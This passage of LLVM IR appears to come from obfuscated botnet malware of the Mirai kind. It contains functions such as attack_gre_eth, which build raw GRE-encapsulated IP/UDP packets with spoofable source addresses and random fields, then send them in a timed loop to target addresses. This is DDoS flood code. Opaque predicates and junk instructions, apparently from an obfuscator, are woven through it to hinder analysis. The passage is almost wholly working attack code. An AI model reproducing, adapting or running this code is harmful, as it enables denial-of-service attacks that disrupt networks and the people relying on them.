  %465 = bitcast %struct.iphdr* %464 to i16*
  %466 = call zeroext i16 @checksum_generic(i16* %465, i32 20)
  %467 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 7
  store i16 %466, i16* %468, align 2
  %469 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %470 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %469, i32 0, i32 3
  store i16 0, i16* %470, align 2
  %471 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %472 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %473 = bitcast %struct.udphdr* %472 to i8*
  %474 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %475 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %474, i32 0, i32 2
  %476 = load i16, i16* %475, align 2
  %477 = load i32, i32* %20, align 4
  %478 = sext i32 %477 to i64
  %479 = add i64 8, %478
  %480 = trunc i64 %479 to i32
  %481 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %471, i8* %473, i16 zeroext %476, i32 %480)
  %482 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %483 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %482, i32 0, i32 3
  store i16 %481, i16* %483, align 2
  %484 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %485 = load i32, i32* %11, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i64 %486
  %488 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %487, i32 0, i32 0
  %489 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %488, i32 0, i32 0
  store i16 2, i16* %489, align 4
  %490 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %491 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %490, i32 0, i32 9
  %492 = load i32, i32* %491, align 4
  %493 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %494 = load i32, i32* %11, align 4
  %495 = sext i32 %494 to i64
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %493, i64 %495
  %497 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i32 0, i32 0
  %498 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %497, i32 0, i32 2
  %499 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %498, i32 0, i32 0
  store i32 %492, i32* %499, align 4
  %500 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %501 = load i32, i32* %11, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %500, i64 %502
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i32 0, i32 0
  %505 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %504, i32 0, i32 1
  store i16 0, i16* %505, align 2
  %506 = load i32, i32* %12, align 4
  %507 = load i8*, i8** %29, align 8
  %508 = load i32, i32* %20, align 4
  %509 = sext i32 %508 to i64
  %510 = add i64 52, %509
  %511 = bitcast %union.__CONST_SOCKADDR_ARG* %35 to %struct.sockaddr**
  %512 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %513 = load i32, i32* %11, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %515, i32 0, i32 0
  %517 = bitcast %struct.sockaddr_in* %516 to %struct.sockaddr*
  store %struct.sockaddr* %517, %struct.sockaddr** %511, align 8
  %518 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %35, i32 0, i32 0
  %519 = load %struct.sockaddr*, %struct.sockaddr** %518, align 8
  %520 = call i64 @sendto(i32 %506, i8* %507, i64 %510, i32 16384, %struct.sockaddr* %519, i32 16)
  br label %521

; <label>:521:                                    ; preds = %454
  %522 = load i32, i32* %11, align 4
  %523 = add nsw i32 %522, 1
  store i32 %523, i32* %11, align 4
  br label %283

; <label>:524:                                    ; preds = %283
  %525 = load i32, i32* @x.17
  %526 = load i32, i32* @y.18
  %527 = sub i32 %525, 1
  %528 = mul i32 %525, %527
  %529 = urem i32 %528, 2
  %530 = icmp eq i32 %529, 0
  %531 = icmp slt i32 %526, 10
  %532 = or i1 %530, %531
  br i1 %532, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %524
  %533 = call i64 @time(i64* null) #6
  %534 = load i32, i32* %24, align 4
  %535 = sext i32 %534 to i64
  %536 = icmp sgt i64 %533, %535
  %537 = load i32, i32* @x.17
  %538 = load i32, i32* @y.18
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br i1 %536, label %545, label %562

; <label>:545:                                    ; preds = %originalBBpart245
  %546 = load i32, i32* @x.17
  %547 = load i32, i32* @y.18
  %548 = sub i32 %546, 1
  %549 = mul i32 %546, %548
  %550 = urem i32 %549, 2
  %551 = icmp eq i32 %550, 0
  %552 = icmp slt i32 %547, 10
  %553 = or i1 %551, %552
  br i1 %553, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %545
  %554 = load i32, i32* @x.17
  %555 = load i32, i32* @y.18
  %556 = sub i32 %554, 1
  %557 = mul i32 %554, %556
  %558 = urem i32 %557, 2
  %559 = icmp eq i32 %558, 0
  %560 = icmp slt i32 %555, 10
  %561 = or i1 %559, %560
  br i1 %561, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %579

; <label>:562:                                    ; preds = %originalBBpart245
  %563 = load i32, i32* @x.17
  %564 = load i32, i32* @y.18
  %565 = sub i32 %563, 1
  %566 = mul i32 %563, %565
  %567 = urem i32 %566, 2
  %568 = icmp eq i32 %567, 0
  %569 = icmp slt i32 %564, 10
  %570 = or i1 %568, %569
  br i1 %570, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %562
  %571 = load i32, i32* @x.17
  %572 = load i32, i32* @y.18
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %282

; <label>:579:                                    ; preds = %originalBBpart249, %originalBBpart2, %86
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %92
  %580 = load i32, i32* %12, align 4
  %581 = call i32 @close(i32 %580)
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %117
  %582 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %583 = load i8**, i8*** %13, align 8
  %584 = load i32, i32* %11, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds i8*, i8** %583, i64 %585
  store i8* %582, i8** %586, align 8
  %587 = load i8**, i8*** %13, align 8
  %588 = load i32, i32* %11, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds i8*, i8** %587, i64 %589
  %591 = load i8*, i8** %590, align 8
  %592 = bitcast i8* %591 to %struct.iphdr*
  store %struct.iphdr* %592, %struct.iphdr** %25, align 8
  %593 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %594 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %593, i64 1
  %595 = bitcast %struct.iphdr* %594 to %struct.grehdr*
  store %struct.grehdr* %595, %struct.grehdr** %26, align 8
  %596 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %597 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %596, i64 1
  %598 = bitcast %struct.grehdr* %597 to %struct.iphdr*
  store %struct.iphdr* %598, %struct.iphdr** %27, align 8
  %599 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %600 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %599, i64 1
  %601 = bitcast %struct.iphdr* %600 to %struct.udphdr*
  store %struct.udphdr* %601, %struct.udphdr** %28, align 8
  %602 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %603 = bitcast %struct.iphdr* %602 to i8*
  %604 = load i8, i8* %603, align 4
  %_ = shl i8 %604, 15
  %_2 = sub i8 %604, 15
  %gen = mul i8 %_2, 15
  %605 = and i8 %604, 15
  %_3 = shl i8 %605, 64
  %_4 = sub i8 0, %605
  %gen5 = add i8 %_4, 64
  %_6 = shl i8 %605, 64
  %606 = or i8 %605, 64
  store i8 %606, i8* %603, align 4
  %607 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %608 = bitcast %struct.iphdr* %607 to i8*
  %609 = load i8, i8* %608, align 4
  %_7 = sub i8 0, %609
  %gen8 = add i8 %_7, -16
  %610 = and i8 %609, -16
  %_9 = sub i8 %610, 5
  %gen10 = mul i8 %_9, 5
  %_11 = shl i8 %610, 5
  %_12 = shl i8 %610, 5
  %611 = or i8 %610, 5
  store i8 %611, i8* %608, align 4
  %612 = load i8, i8* %14, align 1
  %613 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %614 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %613, i32 0, i32 1
  store i8 %612, i8* %614, align 1
  %615 = load i32, i32* %20, align 4
  %616 = sext i32 %615 to i64
  %_13 = shl i64 52, %616
  %_14 = sub i64 52, %616
  %gen15 = mul i64 %_14, %616
  %_16 = sub i64 0, 52
  %gen17 = add i64 %_16, %616
  %_18 = sub i64 52, %616
  %gen19 = mul i64 %_18, %616
  %_20 = sub i64 0, 52
  %gen21 = add i64 %_20, %616
  %_22 = sub i64 52, %616
  %gen23 = mul i64 %_22, %616
  %_24 = shl i64 52, %616
  %617 = add i64 52, %616
  %618 = trunc i64 %617 to i16
  %619 = call zeroext i16 @htons(i16 zeroext %618) #7
  %620 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %621 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %620, i32 0, i32 2
  store i16 %619, i16* %621, align 2
  %622 = load i16, i16* %15, align 2
  %623 = call zeroext i16 @htons(i16 zeroext %622) #7
  %624 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %625 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %624, i32 0, i32 3
  store i16 %623, i16* %625, align 4
  %626 = load i8, i8* %16, align 1
  %627 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %628 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %627, i32 0, i32 5
  store i8 %626, i8* %628, align 4
  %629 = load i8, i8* %17, align 1
  %630 = icmp ne i8 %629, 0
  br label %originalBB1

originalBB28alteredBB:                            ; preds = %originalBB28, %344
  %631 = load i16, i16* %15, align 2
  %632 = zext i16 %631 to i32
  %633 = icmp eq i32 %632, 65535
  br label %originalBB28

originalBB32alteredBB:                            ; preds = %originalBB32, %379
  %634 = load i16, i16* %18, align 2
  %635 = zext i16 %634 to i32
  %636 = icmp eq i32 %635, 65535
  br label %originalBB32

originalBB36alteredBB:                            ; preds = %originalBB36, %409
  %637 = call i32 @rand_next()
  %_37 = sub i32 0, %637
  %gen38 = add i32 %_37, 65535
  %_39 = shl i32 %637, 65535
  %638 = and i32 %637, 65535
  %639 = trunc i32 %638 to i16
  %640 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %641 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %640, i32 0, i32 1
  store i16 %639, i16* %641, align 2
  br label %originalBB36

originalBB43alteredBB:                            ; preds = %originalBB43, %524
  %642 = call i64 @time(i64* null) #6
  %643 = load i32, i32* %24, align 4
  %644 = sext i32 %643 to i64
  %645 = icmp sgt i64 %642, %644
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %545
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %562
  br label %originalBB51
}

; Function Attrs: nounwind
declare i64 @time(i64*) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 19, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %111

; <label>:94:                                     ; preds = %5
  %95 = load i32, i32* @x.19
  %96 = load i32, i32* @y.20
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %94
  %103 = load i32, i32* @x.19
  %104 = load i32, i32* @y.20
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %666

; <label>:111:                                    ; preds = %5
  store i32 1, i32* %11, align 4
  %112 = load i32, i32* %12, align 4
  %113 = bitcast i32* %11 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #6
  %115 = icmp eq i32 %114, -1
  br i1 %115, label %116, label %135

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @x.19
  %118 = load i32, i32* @y.20
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %116
  %125 = load i32, i32* %12, align 4
  %126 = call i32 @close(i32 %125)
  %127 = load i32, i32* @x.19
  %128 = load i32, i32* @y.20
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %666

; <label>:135:                                    ; preds = %111
  %136 = load i32, i32* @x.19
  %137 = load i32, i32* @y.20
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %135
  store i32 0, i32* %11, align 4
  %144 = load i32, i32* @x.19
  %145 = load i32, i32* @y.20
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %152

; <label>:152:                                    ; preds = %308, %originalBBpart28
  %153 = load i32, i32* %11, align 4
  %154 = load i8, i8* %7, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %153, %155
  br i1 %156, label %157, label %311

; <label>:157:                                    ; preds = %152
  %158 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %159 = load i8**, i8*** %13, align 8
  %160 = load i32, i32* %11, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %13, align 8
  %164 = load i32, i32* %11, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %25, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.grehdr*
  store %struct.grehdr* %171, %struct.grehdr** %26, align 8
  %172 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %173 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %172, i64 1
  %174 = bitcast %struct.grehdr* %173 to %struct.ethhdr*
  store %struct.ethhdr* %174, %struct.ethhdr** %27, align 8
  %175 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %176 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %175, i64 1
  %177 = bitcast %struct.ethhdr* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %28, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %29, align 8
  %181 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %182 = bitcast %struct.iphdr* %181 to i8*
  %183 = load i8, i8* %182, align 4
  %184 = and i8 %183, 15
  %185 = or i8 %184, 64
  store i8 %185, i8* %182, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, -16
  %190 = or i8 %189, 5
  store i8 %190, i8* %187, align 4
  %191 = load i8, i8* %14, align 1
  %192 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %193 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %192, i32 0, i32 1
  store i8 %191, i8* %193, align 1
  %194 = load i32, i32* %20, align 4
  %195 = sext i32 %194 to i64
  %196 = add i64 66, %195
  %197 = trunc i64 %196 to i16
  %198 = call zeroext i16 @htons(i16 zeroext %197) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 2
  store i16 %198, i16* %200, align 2
  %201 = load i16, i16* %15, align 2
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 3
  store i16 %202, i16* %204, align 4
  %205 = load i8, i8* %16, align 1
  %206 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 5
  store i8 %205, i8* %207, align 4
  %208 = load i8, i8* %17, align 1
  %209 = icmp ne i8 %208, 0
  br i1 %209, label %210, label %214

; <label>:210:                                    ; preds = %157
  %211 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 4
  store i16 %211, i16* %213, align 2
  br label %214

; <label>:214:                                    ; preds = %210, %157
  %215 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 47, i8* %216, align 1
  %217 = load i32, i32* %23, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %221 = load i32, i32* %11, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %229 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %230 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %229, i32 0, i32 1
  store i16 %228, i16* %230, align 2
  %231 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %232 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %233 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %232, i32 0, i32 2
  store i16 %231, i16* %233, align 1
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = bitcast %struct.iphdr* %234 to i8*
  %236 = load i8, i8* %235, align 4
  %237 = and i8 %236, 15
  %238 = or i8 %237, 64
  store i8 %238, i8* %235, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %240 = bitcast %struct.iphdr* %239 to i8*
  %241 = load i8, i8* %240, align 4
  %242 = and i8 %241, -16
  %243 = or i8 %242, 5
  store i8 %243, i8* %240, align 4
  %244 = load i8, i8* %14, align 1
  %245 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 1
  store i8 %244, i8* %246, align 1
  %247 = load i32, i32* %20, align 4
  %248 = sext i32 %247 to i64
  %249 = add i64 28, %248
  %250 = trunc i64 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %15, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = trunc i32 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 3
  store i16 %258, i16* %260, align 4
  %261 = load i8, i8* %16, align 1
  %262 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 5
  store i8 %261, i8* %263, align 4
  %264 = load i8, i8* %17, align 1
  %265 = icmp ne i8 %264, 0
  br i1 %265, label %266, label %270

; <label>:266:                                    ; preds = %214
  %267 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %268 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 4
  store i16 %267, i16* %269, align 2
  br label %270

; <label>:270:                                    ; preds = %266, %214
  %271 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 6
  store i8 17, i8* %272, align 1
  %273 = call i32 @rand_next()
  %274 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 8
  store i32 %273, i32* %275, align 4
  %276 = load i8, i8* %22, align 1
  %277 = icmp ne i8 %276, 0
  br i1 %277, label %278, label %284

; <label>:278:                                    ; preds = %270
  %279 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 9
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  store i32 %281, i32* %283, align 4
  br label %292

; <label>:284:                                    ; preds = %270
  %285 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  %287 = load i32, i32* %286, align 4
  %288 = sub i32 %287, 1024
  %289 = xor i32 %288, -1
  %290 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %289, i32* %291, align 4
  br label %292

